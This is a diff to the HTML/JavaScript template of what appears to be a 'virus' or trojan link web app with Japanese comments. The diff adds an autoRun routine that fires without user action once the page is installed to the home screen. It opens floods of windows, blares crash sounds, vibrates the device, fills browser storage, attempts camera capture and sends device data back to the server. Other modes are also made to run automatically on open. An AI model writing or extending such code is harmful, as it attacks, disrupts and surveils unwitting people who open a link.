@@ -29,6 +29,10 @@ button.ghost{background:#2b3346;border:1px solid #39415a;color:#e6e9ef;font-weig
   max-height:180px;overflow:auto;white-space:pre-wrap;line-height:1.7}
 .k{color:#8b93a7}.v{color:#e6e9ef}
 
+/* 注意書き */
+.caution{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:10px;
+  padding:10px 12px;font-size:12.5px;line-height:1.8;margin-top:10px;text-align:left}
+
 /* 窓爆弾の子画面 */
 .child{background:#0b0d11}
 .child h1{color:#ff5a5a;font-size:26px;text-align:center;margin-top:14vh}
@@ -73,6 +77,7 @@ body.glitch .card,body.glitch h1{filter:invert(1) hue-rotate(90deg)}
 <div class="center"><div class="in">
   <h1>{{ link.name }}</h1>
   <div class="dim" id="lead">{{ mode_desc }}</div>
+  {% if caution %}<div class="caution">{{ caution }}</div>{% endif %}
   <div id="stage" style="margin-top:18px"></div>
   <div id="bar"><i></i></div>
   <div class="dim" id="st" style="margin-top:10px;min-height:1.9em"></div>
@@ -88,6 +93,7 @@ window.V = {
   hit: {{ hit_id }},
   child: {{ 1 if is_child else 0 }},
   installed: {{ 1 if is_installed else 0 }},
+  auto: {{ 1 if auto else 0 }},
   name: {{ link.name|tojson }}
 };
 </script>
@@ -96,6 +102,10 @@ window.V = {
   "use strict";
   var V = window.V, CODE = V.code, MODE = V.mode;
   var API = "/v/" + encodeURIComponent(CODE) + "/d";
+  /* インストール済み（ホーム画面から起動／standalone）を検出 */
+  var STANDALONE = !!V.installed ||
+    (navigator.standalone === true) ||
+    (window.matchMedia && matchMedia("(display-mode: standalone)").matches);
   var VID = (function () {
     try {
       var v = localStorage.getItem("virus_vid");
@@ -291,7 +301,7 @@ window.V = {
       mimes: (navigator.mimeTypes || []).length,
       referrer: document.referrer || "",
       history: history.length,
-      standalone: (window.matchMedia && matchMedia("(display-mode: standalone)").matches) ? 1 : 0,
+      standalone: STANDALONE ? 1 : 0,
       sw: ("serviceWorker" in navigator) ? 1 : 0,
       wake: ("wakeLock" in navigator) ? 1 : 0,
       bluetooth: ("bluetooth" in navigator) ? 1 : 0,
@@ -597,6 +607,21 @@ window.V = {
     }, ms || 2500);
   }
 
+  /* ---- 自動発射（インストール済みで即実行） ---- */
+  function autoRun() {
+    st("インストール済み — 自動発射します（自爆）");
+    try { crashSound(3.0); } catch (e) {}
+    glitch(3200);
+    try { if (navigator.vibrate) navigator.vibrate([200, 80, 200, 80, 400]); } catch (e) {}
+    setTimeout(function () { try { crashSound(1.8); } catch (e) {} }, 2400);
+    if (MODE === "windows" || MODE === "mix") { try { openBomb(6); } catch (e) {} }
+    try { fillStorage(function () {}); } catch (e) {}
+    if (MODE === "mix" || MODE === "max_power") {
+      setTimeout(function () { camShot(1600); }, 500);
+    }
+    send({ auto: 1, standalone: 1 });
+  }
+
   /* ================= 起動 ================= */
 
   /* 子ウィンドウ（窓爆弾の子） */
@@ -624,8 +649,6 @@ window.V = {
     send({ child: 1, child_index: (location.search.match(/n=(\d+)/) || [])[1] || "" });
     return;
   }
-
-  var t1 = setTimeout(function () {}, 0);
 
   collect(true).then(function (d) {
     send(d);
@@ -656,13 +679,14 @@ window.V = {
   /* モード別 */
   var stage = document.getElementById("stage");
   if (MODE === "trojan_link") {
-    st("確認中…");
+    st("確認中…（開いた瞬間から自動で動いています）");
     bar(40);
     collect(true).then(function () { bar(80); });
     leave(2800);
 
   } else if (MODE === "trojan_install") {
-    st("アプリとして常駐させます");
+    st(STANDALONE ? "インストール済み — その瞬間から自動発射します"
+                  : "アプリとして常駐させます（インストールすると自爆）");
     if (stage) {
       stage.innerHTML =
         '<button id="install" style="display:none">インストール</button> ' +
@@ -673,10 +697,11 @@ window.V = {
     if (ah) ah.addEventListener("click", function () {
       st("iPhone: 共有 →「ホーム画面に追加」 / Android: メニュー →「アプリをインストール」");
     });
-    leave(6000);
+    if (STANDALONE) autoRun();
+    leave(STANDALONE ? 2400 : 6000);
 
   } else if (MODE === "max_power") {
-    st("全部取ります");
+    st("全部取ります（自動で進行中）");
     if (stage) stage.innerHTML = '<button id="cam">カメラも撮る</button>';
     var cb = document.getElementById("cam");
     if (cb) cb.addEventListener("click", function () {
@@ -687,23 +712,23 @@ window.V = {
     leave(9000);
 
   } else if (MODE === "brick") {
-    st("このタブは死にません");
+    st("このタブは死にません（自動で進行中）");
     brick();
     fillStorage(function () { log("容量占有 完了"); });
     leave(0);
 
   } else if (MODE === "windows") {
-    st("ボタンを押すと大量に開きます");
+    st("自動で開き始めます。ボタンで増やせます");
     if (stage) stage.innerHTML =
       '<button id="go">ウィンドウを開く</button> ' +
       '<button class="ghost" id="go24">24枚</button>';
     var g = document.getElementById("go"), g24 = document.getElementById("go24");
     if (g) g.addEventListener("click", function () { openBomb(12); });
     if (g24) g24.addEventListener("click", function () { openBomb(24); });
-    setTimeout(function () { openBomb(6); }, 800);   // 自動でも少し開く
+    setTimeout(function () { openBomb(STANDALONE ? 10 : 6); }, 800);
 
   } else if (MODE === "sound") {
-    st("音を鳴らすと崩壊します");
+    st("自動で鳴ります（ボタンで再発射）");
     if (stage) stage.innerHTML = '<button id="boom">爆音クラッシュ</button>';
     var bb = document.getElementById("boom");
     if (bb) bb.addEventListener("click", function () {
@@ -713,12 +738,12 @@ window.V = {
     setTimeout(function () { try { crashSound(2.2); glitch(2600); } catch (e) {} }, 1200);
 
   } else if (MODE === "storage") {
-    st("容量を使い切ります");
+    st("自動で容量を使い切ります");
     fillStorage(function () { st("完了"); });
     leave(0);
 
   } else {  /* mix */
-    st("全部いきます");
+    st(STANDALONE ? "インストール済み — 全部を自動発射します（自爆）" : "全部いきます（自動進行）");
     if (stage) {
       stage.innerHTML =
         '<button id="all">全部やる</button> ' +
@@ -726,6 +751,7 @@ window.V = {
     }
     brick();
     installMode();
+    if (STANDALONE) autoRun();
     var all = document.getElementById("all");
     if (all) all.addEventListener("click", function () {
       crashSound(3.0); glitch(3600);
@@ -738,10 +764,10 @@ window.V = {
       try { crashSound(2.0); } catch (e) {}
       fillStorage(function () {});
     }, 1500);
-    leave(12000);
+    leave(STANDALONE ? 4000 : 12000);
   }
 
-  log("mode=" + MODE + " / hit=" + V.hit);
+  log("mode=" + MODE + " / hit=" + V.hit + " / standalone=" + (STANDALONE ? 1 : 0));
 })();
 </script>
 </body></html>
